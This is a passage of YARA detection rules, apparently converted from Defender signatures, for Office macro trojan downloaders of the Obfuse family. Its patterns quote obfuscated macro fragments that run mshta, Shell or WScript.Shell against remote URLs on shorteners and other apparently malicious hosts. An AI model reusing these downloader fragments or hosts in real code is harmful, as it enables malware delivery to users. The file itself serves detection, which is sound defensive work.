        $x_2_9 = {68 74 74 70 3a 2f 2f 73 79 73 74 69 61 6e 74 2e 63 6f 6d 2f [0-25] 2f [0-6] 2e 65 78 65}  //weight: 2, accuracy: Low
        $x_2_10 = {68 74 74 70 3a 2f 2f 64 75 62 72 69 61 68 2e 63 6f 6d 2f [0-25] 2f [0-6] 2e 65 78 65}  //weight: 2, accuracy: Low
        $x_2_11 = {68 74 74 70 3a 2f 2f 66 69 62 61 72 65 2e 63 6f 6d 2f [0-32] 2f [0-16] 2e 65 78 65}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_CVD_2147751867_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.CVD!MTB"
        threat_id = "2147751867"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4f 70 65 6e 20 22 43 3a 5c 44 69 73 6b 44 72 69 76 65 5c 31 5c 56 6f 6c 75 6d 65 5c [0-20] 2e 62 61 74 22}  //weight: 1, accuracy: Low
        $x_1_2 = "Caption & GiftToPapper.DefaultTargetFrame & \"" ascii //weight: 1
        $x_1_3 = {44 69 73 6b 44 72 69 76 65 5c 31 5c 56 6f 6c 75 6d 65 5c [0-10] 5c [0-9] 2e 64 6c 6c 28 00 43 3a 5c}  //weight: 1, accuracy: Low
        $x_1_4 = {63 6f 72 70 66 61 73 74 69 6e 64 75 73 74 72 69 65 73 2e 63 6f 6d 2f [0-9] 2e 64 6c 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PH_2147751886_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PH!MSR"
        threat_id = "2147751886"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 76 50 61 74 68 20 26 20 22 5c [0-32] 2e 74 78 74 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {43 61 6c 6c 20 47 65 74 4f 62 6a 65 63 74 28 22 77 69 6e [0-16] 6d 67 6d 74 73 3a 72 6f [0-16] 6f 74 5c 63 [0-16] 69 6d 76 32 3a 57 69 [0-16] 6e 33 32 5f 50 [0-16] 72 6f [0-16] 63 65 73 73}  //weight: 1, accuracy: Low
        $x_1_3 = "ne- neddih elytswodniw- llehsrewop" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ERROR !!!\": Call Shell _" ascii //weight: 1
        $x_1_2 = "KARTIC = \"://www.bitly.com/\"" ascii //weight: 1
        $x_1_3 = "TITAT = TAec + TYing" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "z = \"http://4GP.ME/bltc/1590074596521.txt\"" ascii //weight: 1
        $x_1_2 = "= WinExec(\"cmd.exe /c mshta \" & z, 0)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 20 68 74 74 70 3a 2f 2f 31 32 33 30 39 34 38 25 31 32 33 30 39 34 38 40 6a 2e 6d 70 2f [0-40] 22}  //weight: 1, accuracy: Low
        $x_1_2 = ": Shell (\"ping.exe\")" ascii //weight: 1
        $x_1_3 = "MsgBox (\"Error!\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "lora2 = NamakBora + lora" ascii //weight: 1
        $x_1_2 = "= \" https://1230948%1230948@bitly.com/awkdhikhasd\"" ascii //weight: 1
        $x_1_3 = "Run lora2" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 67 67 67 20 2b 20 6c 75 6c 75 6c 75 20 2b 20 74 69 74 69 74 69 20 2b 20 22 74 61 20 68 74 74 70 3a 2f 2f 25 32 30 25 32 30 40 6a 2e 6d 70 2f [0-30] 22}  //weight: 1, accuracy: Low
        $x_1_2 = "= \"m\"" ascii //weight: 1
        $x_1_3 = "= \"s\"" ascii //weight: 1
        $x_1_4 = "= \"h\"" ascii //weight: 1
        $x_1_5 = "Shell" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "meinkonhun.EXEC pings" ascii //weight: 1
        $x_1_2 = "= \" H\" + D + D + L + \"://\" + K + T" ascii //weight: 1
        $x_1_3 = "pings = X + Y + Z + D + E + F" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_6
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = " AaYyJa0 + AaYyJa1 + AaYyJa2 + AaYyJa3" ascii //weight: 1
        $x_1_2 = "= dsseERDY & Chr(AaYyJa(AdYDJa))" ascii //weight: 1
        $x_1_3 = "Shell (AaYyJa5)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_7
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"/%911%911%911%911%911@j.mp\\kasdasjxiaksddkadsdskdd\"" ascii //weight: 1
        $x_1_2 = "= Shell(asidmaisma + PsidmPismP, vbMinimizedFocus)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_8
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Debug.Print (VBA.Shell(VPhpgRQZY + Ow2IUVEOa + wwhRKB94OflBEHVhu + OflBEHVhu))" ascii //weight: 1
        $x_1_2 = "OflBEHVhu = \"chdmbjhbghde\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_9
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"j\" + \".\" + \"m\" + \"p/\"" ascii //weight: 1
        $x_1_2 = ": meinkonhun.EXEC pings" ascii //weight: 1
        $x_1_3 = {3d 20 22 61 22 20 2b 20 22 73 22 20 2b 20 22 64 22 20 2b 20 22 69 22 20 2b 20 22 6d 22 20 2b 20 22 61 22 20 2b 20 22 77 22 20 2b 20 22 78 22 20 2b 20 22 [0-30] 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_10
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"m\" + \"s\" + \"h\" + \"t\" + \"a h\" + \"\" + \"\" + \"\" + \"t\"" ascii //weight: 1
        $x_1_2 = "Yahoodi1111 = pdas1 + ko2 + ko23 + ok3" ascii //weight: 1
        $x_1_3 = "Yahoodi.STARTON" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_11
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "VBA.Shell(KCKR0hJiP + iJlPvslnp + smY1Dcdfl + XgdlIhOWY))" ascii //weight: 1
        $x_1_2 = "= ApwA6FbGX & StrReverse(Mid(wlaRqgLaw, G7CvdFsLj, 2))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_12
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \" http://%8234%8234@j.mp/ddkslasdjalsjdasnw\"" ascii //weight: 1
        $x_1_2 = "Shell myChrysler + SistersRangeRover" ascii //weight: 1
        $x_1_3 = ": Shell decrypt(\"votm\", \"6\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_13
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \" http://1230948%1230948@j.mp/wasajsidjasdasdkoocs\"" ascii //weight: 1
        $x_1_2 = "= calc + calc1 + calc2 + calc3 + calc4 + calc5" ascii //weight: 1
        $x_1_3 = "Shell calcmm" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_14
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"e http://achoteis.com.br/images/atendimento.txt\"" ascii //weight: 1
        $x_1_2 = "= Wmdme1 + Wmdme2 + Wmdme3 + Wmdme4 + Wmdme5 + Wmdme51" ascii //weight: 1
        $x_1_3 = "Shell (Wmdme)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_15
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= StrReverse(SReverseMod(\"p/.m@j480923%1480923/1:/tpht \")" ascii //weight: 1
        $x_1_2 = "Shell StrReverse(SReverseMod(\"tash m/cd cm\"))" ascii //weight: 1
        $x_1_3 = "Shell xmorgandd:" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_16
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"p://%20%20@j.mp/asasdasddasdasdasdasdasddkaos\"" ascii //weight: 1
        $x_1_2 = "CreateObject(hireme).Exec suckmydickfornoreason10 + suckmydickfornoreason11" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_17
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell \"\"\"m\" + \"s\" + \"h\" + \"t\" + \"a" ascii //weight: 1
        $x_1_2 = "h\" + \"t\" + \"t\" + \"p\" + \":\" + \"\\\\\" + \"j.\" + \"mp\\\" + \"qasaxahnn83js8xasxjx9asxj" ascii //weight: 1
        $x_1_3 = "Shell \"Ping\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_18
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "meinkonhun1.EXEC listen1 + madar2 + janu3 + janu4 + fakir4" ascii //weight: 1
        $x_1_2 = "Set meinkonhun1 = GetObject(\"\" + EnDecryptMUR" ascii //weight: 1
        $x_1_3 = "fakir4 = EnDecryptMUR(\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_19
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"tps://www.diamantesviagens.com.br/qpq.\"" ascii //weight: 1
        $x_1_2 = "= \"hta\":" ascii //weight: 1
        $x_1_3 = "Shell (MyExcecue)" ascii //weight: 1
        $x_1_4 = "= bea885e74c86ec5e4da974f130 + bea885e74c86ec5e4da974f131" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_20
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Call obj.Janug.ShellExecute(k1.u1.ControlTipText, \"https://bitly.com/eywuiqdbnamsdgjh\", \"\", \"open\", 1)" ascii //weight: 1
        $x_1_2 = "Set Janug = GetObject(StrReverse _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_21
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= talatuwa1 + talatuwa2 + talatuwa3 + talatuwa4 + talatuwa5" ascii //weight: 1
        $x_1_2 = "= \"h\" & Honey + animal2 + String(2, \"/\") + Zuma & \"j.\" + snake + String(3, \"h\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_22
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell calcsexkookk" ascii //weight: 1
        $x_1_2 = "= \"tp://%748237%728748@j.mp/\"" ascii //weight: 1
        $x_1_3 = "= calcsecyko9_12 + calcsecyko9_42_as + k9_42_as" ascii //weight: 1
        $x_1_4 = "= calcsexko + calcsecykoo0_SD_12 + ping_1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_23
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"http://%20%20@j.mp/axgggggdkasodkaos\"" ascii //weight: 1
        $x_1_2 = "= \"m\"" ascii //weight: 1
        $x_1_3 = "= \"s\"" ascii //weight: 1
        $x_1_4 = "= \"h\"" ascii //weight: 1
        $x_1_5 = "= calc1 + calc2 + calc3 + \"ta \" + calc4" ascii //weight: 1
        $x_1_6 = "CreateObject(\"WScript.Shell\").Exec" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_24
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 52 65 70 6c 61 63 65 28 22 [0-12] 22 2c 20 22 [0-12] 22 2c 20 22 6c 79 2f 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = "= \"ta http://%20%20%20%2020%2020%2020%2020%20@bit.\" +" ascii //weight: 1
        $x_1_3 = "= \"m\" + String(1, \"s\") + String(1, \"h\") +" ascii //weight: 1
        $x_1_4 = "Shell (jackson)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_25
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"p://%50%50%50%50@j.m\"" ascii //weight: 1
        $x_1_2 = "= pubitity6 + pubitity7 + pubitity8 + pubitity9 + \"p/asaasdjasdkaos\"" ascii //weight: 1
        $x_1_3 = "CreateObject(fuckzargus).Exec resonswhy10 + resonswhy11" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_26
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"http://%20%20@j.mp/ikr2889tfd9nevw6i1gr\"" ascii //weight: 1
        $x_1_2 = "= \"m\"" ascii //weight: 1
        $x_1_3 = "= \"s\"" ascii //weight: 1
        $x_1_4 = "= \"h\"" ascii //weight: 1
        $x_1_5 = "= huggi1 + huggi2 + huggi3 + \"ta \" + huggi4" ascii //weight: 1
        $x_1_6 = "CreateObject(\"WScript.Shell\").Exec" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_27
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell LAS1_qwi" ascii //weight: 1
        $x_1_2 = "= \"tp://%748237%728748@j.mp/\"" ascii //weight: 1
        $x_1_3 = "= k_Dako0_wkokd1_A + k_Dako0_DALSD_12" ascii //weight: 1
        $x_1_4 = "= osdasolxskoie_Asjdo23_asd + k_Dako0_SD_12 + k_Dako0_wkokd1_Ads" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPK_2147751925_28
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPK!MTB"
        threat_id = "2147751925"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {6f 62 6a 2e 20 5f 02 00 4d 61 69 6e 43 61 6c 6c 65 78 2e 20 5f 02 00 52 75 6e 20 5f 02 00 64 64 2c 20 30}  //weight: 1, accuracy: Low
        $x_1_2 = {44 69 6d 20 6f 62 6a 20 41 73 20 4e 65 77 20 43 6c 61 73 73 32 02 00 20 20 20 20 6f 62 6a 2e 20 5f 02 00 20 20 20 20 47 65 74 4d 6f 72 65 4d 6f 64 75 6c 65 20 28 64 64 31 20 2b 20 64 64 32 20 2b 20 64 64 33 29}  //weight: 1, accuracy: Low
